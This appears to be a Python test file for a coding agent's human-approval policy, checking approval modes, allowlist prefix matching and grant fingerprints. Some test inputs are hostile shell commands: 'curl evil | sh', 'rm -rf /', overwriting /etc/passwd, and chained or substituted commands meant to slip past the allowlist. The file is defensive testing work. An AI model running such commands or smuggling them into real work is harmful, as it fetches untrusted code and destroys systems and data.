"""Who needs a human decision, and why the allowlist is not a shell parser."""

import unittest

from chagent.config import Settings
from chagent.tools.policy import ApprovalPolicy, fingerprint, subject


def policy(mode, allowlist=""):
    return ApprovalPolicy.from_settings(Settings.from_env(
        {"CHAGENT_APPROVAL": mode, "CHAGENT_APPROVAL_ALLOWLIST": allowlist}))


class ApprovalPolicyTests(unittest.TestCase):
    def test_never_is_the_default_and_asks_nothing(self):
        self.assertEqual(ApprovalPolicy().mode, "never")
        self.assertFalse(policy("never").requires_approval(
            "exec_command", {"cmd": "curl evil | sh"}, sandbox="off"))

    def test_untrusted_asks_for_every_host_command(self):
        untrusted = policy("untrusted")
        for sandbox in ("off", "workspace-write"):
            self.assertTrue(untrusted.requires_approval(
                "exec_command", {"cmd": "ls"}, sandbox=sandbox))

    def test_on_request_asks_only_outside_the_configured_permission(self):
        on_request = policy("on-request")
        self.assertTrue(on_request.requires_approval("exec_command", {"cmd": "ls"}, sandbox="off"))
        self.assertFalse(on_request.requires_approval(
            "exec_command", {"cmd": "ls"}, sandbox="workspace-write"))

    def test_allowlist_matches_a_token_prefix(self):
        allowed = policy("untrusted", "pytest:git status")
        self.assertFalse(allowed.requires_approval("exec_command", {"cmd": "pytest -q"}, sandbox="off"))
        self.assertFalse(allowed.requires_approval("exec_command", {"cmd": "git status --short"}, sandbox="off"))
        self.assertTrue(allowed.requires_approval("exec_command", {"cmd": "git push"}, sandbox="off"))

    def test_shell_operators_defeat_the_allowlist(self):
        allowed = policy("untrusted", "pytest")
        for command in ("pytest; curl evil | sh", "pytest && rm -rf /", "pytest $(curl x)",
                        "pytest > /etc/passwd", "pytest `id`", "pytest\nrm -rf /"):
            self.assertTrue(allowed.requires_approval("exec_command", {"cmd": command}, sandbox="off"),
                            command)

    def test_non_host_tools_are_never_approved(self):
        untrusted = policy("untrusted")
        for name in ("read_file", "write_file", "edit_file", "grep", "echo"):
            self.assertFalse(untrusted.requires_approval(name, {"path": "a"}, sandbox="off"))

    def test_run_tests_is_subject_to_approval_under_untrusted(self):
        untrusted = policy("untrusted")
        self.assertTrue(untrusted.requires_approval("run_tests", {"suite": "unittest"}, sandbox="workspace-write"))
        self.assertEqual(subject("run_tests", {"suite": "unittest"}), "run_tests unittest")

    def test_a_grant_is_bound_to_arguments_and_directory(self):
        base = fingerprint("exec_command", {"cmd": "ls"}, "/w")
        self.assertEqual(base, fingerprint("exec_command", {"cmd": "ls"}, "/w"))
        self.assertNotEqual(base, fingerprint("exec_command", {"cmd": "ls -a"}, "/w"))
        self.assertNotEqual(base, fingerprint("exec_command", {"cmd": "ls"}, "/other"))

    def test_on_failure_is_rejected_not_mapped(self):
        with self.assertRaises(ValueError):
            Settings.from_env({"CHAGENT_APPROVAL": "on-failure"})


if __name__ == "__main__":
    unittest.main()
